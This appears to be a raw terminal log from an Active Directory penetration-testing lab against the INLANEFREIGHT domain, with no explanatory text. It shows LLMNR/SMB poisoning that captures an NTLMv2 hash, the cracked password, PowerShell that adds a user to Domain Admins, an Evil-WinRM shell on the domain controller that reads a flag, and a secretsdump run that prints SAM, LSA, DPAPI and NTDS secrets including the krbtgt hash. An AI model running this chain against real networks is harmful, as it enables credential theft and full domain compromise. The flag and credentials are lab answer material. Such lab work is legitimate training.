+[+] LLMNR Packet Sniffer [Type A]
+[ ] MDNS
+[ ] NBNS
+[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
+[ ] HTTPS
+[+] WebDAV [WebDAVAuth NTLM]
+[ ] Proxy
+[+] LDAP Listener [Port 389]
+[+] SMB Packet Sniffer [Port 445]
+[+] File Output [C:\Users\mssqlsvc\Documents]
+[+] Previous Session Files (Not Found)
+[*] Press ESC to enter/exit interactive console
+[.] [16:30:30] TCP(445) SYN packet from 172.16.7.3:59649
+[.] [16:30:30] SMB1(445) negotiation request detected from 172.16.7.3:59649
+[.] [16:30:30] SMB2+(445) negotiation request detected from 172.16.7.3:59649
+[+] [16:30:30] SMB(445) NTLM challenge [E8ECAA5ECFF3497C] sent to 172.16.7.50:59649
+[+] [16:30:30] SMB(445) NTLMv2 captured for [INLANEFREIGHT\CT059] from 172.16.7.3(DC01):59649:
+CT059::INLANEFREIGHT:E8ECAA5ECFF3497C:B6A1B12DFC305EB39B1AE22BFA66CCFA:0101000000000000A5C74E6A2F69DB018813DEA66D133AC50000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800A5C74E6A2F69DB01060004000200000008003000300000000000000000000000002000009FA56E132882123A20B8D5D50C8A6EAD29AD586C147430CBA02C1DE5AAD1787C0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
+
+
+CT059:charlie1
+
+$SecPassword = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('inlanefreight\ct059', $SecPassword)
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'mssqlsvc' -Credential $Cred
+┌─[htb-student@skills-par01]─[~]
+└──╼ $evil-winrm -i 172.16.7.3 -u mssqlsvc -p 'Sup3rS3cur3maY5ql$3rverE'
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> cd ../../
+*Evil-WinRM* PS C:\Users> ls
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         4/1/2022   8:05 AM                AB920
+d-----         4/1/2022   8:06 AM                Administrator
+d-----         4/1/2022   8:05 AM                CT059
+d-----        1/17/2025   2:52 PM                mssqlsvc
+d-r---       12/14/2020   6:30 PM                Public
+
+
+*Evil-WinRM* PS C:\Users> cd Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
+acLs_f0r_th3_w1n!
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
+
+┌──(kali㉿kali)-[~/…/job_role_paths/active_directory_penetration_tester/active_directory_enum_and_attacks/skill_assessment2]
+└─$ proxychains4 -q impacket-secretsdump 'inlanefreight.local/mssqlsvc:Sup3rS3cur3maY5ql$3rverE'@172.16.7.3       
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xa019fc1b11608fcf2b9e3f1ed1a4d0c3
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a678b5e7cc4c143b1d76a69ddf14c3ae:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+INLANEFREIGHT\DC01$:aes256-cts-hmac-sha1-96:e17991d4431ecf9b8a552b19dba0dc7015d7223da6a3b28290e19c5f527c3f04
+INLANEFREIGHT\DC01$:aes128-cts-hmac-sha1-96:0fc538a079ba01576cf773a45956e650
+INLANEFREIGHT\DC01$:des-cbc-md5:01985b704a54927f
+INLANEFREIGHT\DC01$:plain_password_hex:95ff12c01ef3ad97ae06831f04bfa97f55565d474b448fa136b5d659ceccadc5734bea64e786110a20fe70b12434792a41fbbf9a45099d5706717cf4c89fed2609ee207469229028f50a171b79069288f2f14d05e4e3084fd8ebeed7009191073f3e3278834083a66b08c387c9b2d4f681e88f3ebedfcfe40492b073c868f8aea44d3fd974134e50c7fad412f2d83684a18c4803595cea08bced8cb1162465f1319de20af9d65d83d1ec01c824788af6dd70d85629228afd802fd8b5595ed6d3b6407c8c41c831295f5f29afda886d8fb8631cb0e44fc38104e8c293783787ca001445e5bdb712af4f2fb20b1f25fd44
+INLANEFREIGHT\DC01$:aad3b435b51404eeaad3b435b51404ee:9018af5f9dd82aea51a6948dd90819d1:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xa92dabba63d597db2eddc95be3a7ccf0e443bb2d
+dpapi_userkey:0xcc8cf003006c9bfffd13954250b85d72942d299c
+[*] NL$KM 
+ 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
+ 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
+ 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
+ 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
+NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:234a798328eb83fda24119597ffba70b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
+inlanefreight.local\NY340:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
+inlanefreight.local\RO050:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
+inlanefreight.local\FF479:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
+inlanefreight.local\EU303:1719:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::
+inlanefreight.local\SX681:1720:aad3b435b51404eeaad3b435b51404ee:0717dbc7b0e91125777d3ff4f3c00533:::
+inlanefreight.local\AJ725:1721:aad3b435b51404eeaad3b435b51404ee:31501a94e6027b74a5710c90d1c7f3b9:::
+inlanefreight.local\PH432:1722:aad3b435b51404eeaad3b435b51404ee:c6885c0fa57ec94542d362cf7dc2d541:::
+inlanefreight.local\GB804:1723:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
+inlanefreight.local\PE286:1724:aad3b435b51404eeaad3b435b51404ee:a9be3a88067ed776d0e2cf4ccde8ec8f:::
+inlanefreight.local\YR796:1725:aad3b435b51404eeaad3b435b51404ee:1b2a9f3b6d785e695aadfe3485a2601f:::
+inlanefreight.local\WM015:1726:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
+inlanefreight.local\FV068:1727:aad3b435b51404eeaad3b435b51404ee:c15d04d9a989b3c9f1d2db979ffa325f:::
+inlanefreight.local\PG619:1728:aad3b435b51404eeaad3b435b51404ee:e7d0a88542cb44ab48e5a89d864f8146:::
+inlanefreight.local\RN329:1729:aad3b435b51404eeaad3b435b51404ee:9b12a0a33aabdbd845cd3ed5070820b9:::
+inlanefreight.local\MC188:1730:aad3b435b51404eeaad3b435b51404ee:1ab3ee9bd2e35ad25670481d9d1b4e0f:::
+inlanefreight.local\BZ453:1731:aad3b435b51404eeaad3b435b51404ee:1e22653293daff337f58d32695c999d0:::
+inlanefreight.local\NY250:1732:aad3b435b51404eeaad3b435b51404ee:a90431144f59bc8aeecc28038d6bda40:::
+inlanefreight.local\EZ869:1733:aad3b435b51404eeaad3b435b51404ee:8a4c52fc75514ddb740971e26b9311d9:::
+inlanefreight.local\YH381:1734:aad3b435b51404eeaad3b435b51404ee:4befb46af523d5899f605eb13fa91788:::
+inlanefreight.local\SE844:1735:aad3b435b51404eeaad3b435b51404ee:9dbd90a7155594a3950791b2a20b90dd:::
